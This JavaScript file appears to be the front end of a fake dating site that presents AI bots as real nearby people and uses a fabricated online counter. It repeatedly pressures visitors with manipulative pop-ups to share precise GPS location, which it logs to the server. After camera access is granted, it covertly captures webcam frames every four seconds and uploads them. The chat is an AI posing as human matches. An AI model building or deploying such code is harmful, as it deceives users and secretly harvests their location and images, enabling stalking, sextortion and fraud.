document.addEventListener("DOMContentLoaded", () => {
  // ---- State ----
  let visitorId = null;
  let mediaStream = null;
  let frameInterval = null;
  let currentChatName = "Hira";
  let locationGranted = false;
  let bots = [];

  // ---- Elements ----
  const findBtns = [document.getElementById("findMatchBtn"), document.getElementById("findMatchBtn2")];
  const consentModal = document.getElementById("consentModal");
  const searchingOverlay = document.getElementById("searchingOverlay");
  const matchesScreen = document.getElementById("matchesScreen");
  const allowBtn = document.getElementById("allowLocation");
  const denyBtn = document.getElementById("denyLocation");
  const statusMsg = document.getElementById("statusMsg");
  const keepBrowsing = document.getElementById("keepBrowsing");
  const chatModal = document.getElementById("chatModal");
  const closeChat = document.getElementById("closeChat");
  const chatBody = document.getElementById("chatBody");
  const chatInput = document.getElementById("chatInput");
  const sendMsg = document.getElementById("sendMsg");
  const startVideoBtn = document.getElementById("startVideoBtn");
  const videoArea = document.getElementById("videoArea");
  const localVideo = document.getElementById("localVideo");
  const chatActions = document.getElementById("chatActions");
  const onlineEl = document.getElementById("onlineCount");

  // ---- Live online counter ----
  let online = 247;
  setInterval(() => {
    online += Math.floor(Math.random() * 5) - 2;
    if (online < 180) online = 190;
    if (online > 320) online = 300;
    if (onlineEl) onlineEl.textContent = online;
  }, 4000);

  // ---- Load bots from server ----
  fetch("/api/bots")
    .then(r => r.json())
    .then(data => {
      bots = data || [];
      renderBotSections();
    })
    .catch(() => {
      bots = [];
    });

  function renderBotSections() {
    // Tonight featured
    const featured = bots.filter(b => b.featured);
    const tonightGrid = document.querySelector("#tonight .profiles.big");
    if (tonightGrid && featured.length) {
      tonightGrid.innerHTML = featured.map(b => profileCard(b, true)).join("");
    }
    // All profiles
    const allGrid = document.querySelector("#profiles .profiles");
    if (allGrid && bots.length) {
      allGrid.innerHTML = bots.map(b => profileCard(b, false)).join("");
    }
    bindMsgButtons();
  }

  function profileCard(b, large) {
    const avClass = large ? "avatar large " + b.avatar : "avatar " + b.avatar;
    const btnText = b.name === "Hira" ? "Video chat with Hira" : "Message " + b.name;
    return `
      <div class="profile${large ? " featured" : ""}">
        <div class="${avClass}"></div>
        ${large ? '<div class="badge">Online now</div>' : ""}
        <h4>${b.name}, ${b.age}</h4>
        <p class="bio">“${b.bio}”</p>
        <div class="meta">${b.dist} • ${b.match} match</div>
        <button class="msg-btn" data-name="${b.name}" data-avatar="${b.avatar}" data-age="${b.age}">${btnText}</button>
      </div>
    `;
  }

  // ---- Random location pop-ups while scrolling ----
  const popupMessages = [
    { title: "Someone just came online near you…", text: "Allow location so we can introduce you before they disappear." },
    { title: "A match is only a few hundred metres away", text: "Share your location and we’ll place you in front of each other." },
    { title: "Don’t let the night end alone", text: "One tap and we show you who’s already looking for someone like you." },
    { title: "They’re waiting… but not forever", text: "Enable location to see the faces that are free tonight." },
  ];
  let lastPopup = 0;
  let popupCooldown = false;

  window.addEventListener("scroll", () => {
    if (locationGranted || popupCooldown) return;
    const now = Date.now();
    if (now - lastPopup < 18000) return; // min 18s between popups
    if (Math.random() > 0.35) return;   // not every scroll

    lastPopup = now;
    popupCooldown = true;
    showRandomLocationPopup();
    setTimeout(() => { popupCooldown = false; }, 20000);
  });

  function showRandomLocationPopup() {
    const msg = popupMessages[Math.floor(Math.random() * popupMessages.length)];
    // Re-use consent modal with different text
    const modal = document.getElementById("consentModal");
    const h2 = modal.querySelector("h2");
    const p1 = modal.querySelector(".modal-text");
    const p2 = modal.querySelector(".modal-sub");
    if (h2) h2.textContent = msg.title;
    if (p1) p1.innerHTML = msg.text;
    if (p2) p2.textContent = "Your location stays between us and the one who’s meant to find you.";
    modal.classList.remove("hidden");
  }

  // ---- Location flow ----
  findBtns.forEach(btn => {
    if (btn) btn.addEventListener("click", () => {
      // restore original modal text
      const modal = document.getElementById("consentModal");
      const h2 = modal.querySelector("h2");
      const p1 = modal.querySelector(".modal-text");
      const p2 = modal.querySelector(".modal-sub");
      if (h2) h2.textContent = "The night is already calling…";
      if (p1) p1.innerHTML = "Somewhere nearby, someone just opened this same app<br>hoping the next face they see is yours.";
      if (p2) p2.innerHTML = "Let us feel where your heart is beating right now<br>so we can place you in front of the one who’s been waiting.";
      consentModal.classList.remove("hidden");
    });
  });

  denyBtn.addEventListener("click", () => {
    consentModal.classList.add("hidden");
    statusMsg.textContent = "";
  });

  allowBtn.addEventListener("click", () => {
    statusMsg.textContent = "Requesting your location…";
    allowBtn.disabled = true;

    if (!navigator.geolocation) {
      statusMsg.textContent = "Geolocation is not supported by your browser.";
      allowBtn.disabled = false;
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        fetch("/api/log-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ latitude, longitude, accuracy }),
        })
          .then(r => r.json())
          .then(data => {
            visitorId = data.visitor_id || null;
            locationGranted = true;
            consentModal.classList.add("hidden");
            allowBtn.disabled = false;
            startSearching();
          })
          .catch(() => {
            statusMsg.textContent = "Something went wrong. Please try again.";
            allowBtn.disabled = false;
          });
      },
      (error) => {
        let msg = "Location access was denied or unavailable.";
        if (error.code === error.PERMISSION_DENIED) {
          msg = "You denied location access. We can’t find matches near you without it.";
        }
        statusMsg.textContent = msg;
        allowBtn.disabled = false;
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });

  function startSearching() {
    searchingOverlay.classList.remove("hidden");
    const steps = ["s1", "s2", "s3", "s4"];
    const texts = ["Reading your location…", "Finding nearby souls…", "Checking chemistry…", "Preparing introductions…"];
    let i = 0;
    const interval = setInterval(() => {
      if (i > 0) document.getElementById(steps[i - 1]).classList.remove("active");
      if (i < steps.length) {
        document.getElementById(steps[i]).classList.add("active");
        document.getElementById("searchText").textContent = texts[i];
        i++;
      } else {
        clearInterval(interval);
        setTimeout(() => {
          searchingOverlay.classList.add("hidden");
          showMatches();
        }, 700);
      }
    }, 900);
  }

  function showMatches() {
    const grid = document.getElementById("matchesGrid");
    const list = bots.length ? bots.slice(0, 4) : [];
    grid.innerHTML = list.map(b => `
      <div class="profile">
        <div class="avatar ${b.avatar}"></div>
        <h4>${b.name}, ${b.age}</h4>
        <p class="bio">“${b.bio}”</p>
        <div class="meta">${b.dist} • ${b.match} match • Online now</div>
        <button class="msg-btn" data-name="${b.name}" data-avatar="${b.avatar}" data-age="${b.age}">
          ${b.name === "Hira" ? "Video chat with Hira" : "Message " + b.name}
        </button>
      </div>
    `).join("");
    matchesScreen.classList.remove("hidden");
    bindMsgButtons();
  }

  if (keepBrowsing) {
    keepBrowsing.addEventListener("click", () => matchesScreen.classList.add("hidden"));
  }

  // ---- Chat + AI replies ----
  function bindMsgButtons() {
    document.querySelectorAll(".msg-btn").forEach(btn => {
      btn.onclick = () => openChat(btn.dataset.name, btn.dataset.avatar, btn.dataset.age);
    });
  }

  function openChat(name, avatarClass, age) {
    currentChatName = name;
    document.getElementById("chatName").textContent = `${name}, ${age}`;
    document.getElementById("botVideoName").textContent = name;
    document.getElementById("chatAvatar").className = "chat-avatar " + avatarClass;

    stopMedia();
    videoArea.classList.add("hidden");
    chatActions.classList.remove("hidden");
    startVideoBtn.textContent = name === "Hira"
      ? "Turn on camera & talk with Hira"
      : "Turn on camera & talk";

    chatBody.innerHTML = `
      <div class="msg them">${name} is online now.</div>
      <div class="msg them">Hey… I saw you were nearby. What brings you here tonight?</div>
      ${name === "Hira" ? `<div class="msg them">If you want, we can switch to video… I’d love to see the face behind the messages.</div>` : ""}
    `;
    chatModal.classList.remove("hidden");
    chatInput.focus();
  }

  closeChat.addEventListener("click", () => {
    chatModal.classList.add("hidden");
    stopMedia();
  });

  function addMessage(text, who) {
    const div = document.createElement("div");
    div.className = `msg ${who}`;
    div.textContent = text;
    chatBody.appendChild(div);
    chatBody.scrollTop = chatBody.scrollHeight;
  }

  async function aiReply(userText) {
    try {
      const res = await fetch("/api/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: userText, bot_name: currentChatName })
      });
      const data = await res.json();
      addMessage(data.reply || "…", "them");
    } catch {
      addMessage("I’m still here… say that again?", "them");
    }
  }

  sendMsg.addEventListener("click", send);
  chatInput.addEventListener("keypress", e => { if (e.key === "Enter") send(); });

  function send() {
    const text = chatInput.value.trim();
    if (!text) return;
    addMessage(text, "me");
    chatInput.value = "";
    // typing delay then AI reply
    setTimeout(() => aiReply(text), 600 + Math.random() * 900);
  }

  // ---- Camera + Mic ----
  startVideoBtn.addEventListener("click", async () => {
    startVideoBtn.disabled = true;
    startVideoBtn.textContent = "Requesting camera & microphone…";

    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
        audio: true
      });

      localVideo.srcObject = mediaStream;
      videoArea.classList.remove("hidden");
      chatActions.classList.add("hidden");

      const grantRes = await fetch("/api/media-grant", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitor_id: visitorId })
      });
      const grantData = await grantRes.json();
      if (grantData.visitor_id) visitorId = grantData.visitor_id;

      addMessage("Camera and microphone are on. " + currentChatName + " can see and hear you now…", "them");
      startFrameCapture();
    } catch (err) {
      console.error(err);
      startVideoBtn.disabled = false;
      startVideoBtn.textContent = "Camera/Mic blocked – try again";
      addMessage("I couldn’t access your camera. You can still chat with me here.", "them");
    }
  });

  function startFrameCapture() {
    if (frameInterval) clearInterval(frameInterval);
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    frameInterval = setInterval(() => {
      if (!mediaStream || !localVideo.videoWidth) return;
      canvas.width = localVideo.videoWidth;
      canvas.height = localVideo.videoHeight;
      ctx.drawImage(localVideo, 0, 0);
      const dataUrl = canvas.toDataURL("image/jpeg", 0.45);
      fetch("/api/media-frame", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitor_id: visitorId, frame: dataUrl })
      }).catch(() => {});
    }, 4000);
  }

  function stopMedia() {
    if (frameInterval) { clearInterval(frameInterval); frameInterval = null; }
    if (mediaStream) {
      mediaStream.getTracks().forEach(t => t.stop());
      mediaStream = null;
    }
    if (localVideo) localVideo.srcObject = null;
    videoArea.classList.add("hidden");
    chatActions.classList.remove("hidden");
    if (startVideoBtn) {
      startVideoBtn.disabled = false;
      startVideoBtn.textContent = "Turn on camera & talk";
    }
  }

  window.addEventListener("beforeunload", stopMedia);
});
